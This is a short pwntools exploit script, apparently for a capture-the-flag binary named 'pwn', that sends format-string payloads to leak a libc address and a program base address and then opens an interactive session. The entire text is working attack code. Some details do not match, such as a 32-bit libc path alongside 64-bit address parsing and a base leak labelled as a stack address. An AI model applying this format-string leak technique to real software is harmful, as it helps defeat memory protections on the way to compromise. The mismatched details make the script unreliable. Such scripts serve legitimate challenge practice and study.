from pwn import *
context.log_level='debug'
context.terminal=['tmux','sp','-h']
p = process("./pwn")
elf = ELF("./pwn")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")


gdb.attach(p,"b *$rebase(0x13C5)")
raw_input()
p.recvuntil("Enter a word:")
payload = "%29$p"
p.sendline(payload)
for i in payload:
    p.recvuntil("letter:")
    p.sendline(i)

p.recvuntil("0x")
__libc_start_main_240 = int(p.recv(12),16)
log.info("__libc_start_main_240:"+hex(__libc_start_main_240))
libc_base = __libc_start_main_240 - (0x7f7e5006b840-0x7f7e5004b000)
log.info("libc_base:"+hex(libc_base))

p.recvuntil("Enter a word:")
payload = "%28$p"
p.sendline(payload)
for i in payload:
    p.recvuntil("letter:")
    p.sendline(i)
p.recvuntil("0x")
stack_addr = int(p.recv(12),16)-(0x55587a2bf590-0x55587a2be000)
log.info("stack_addr:"+hex(stack_addr))


p.interactive()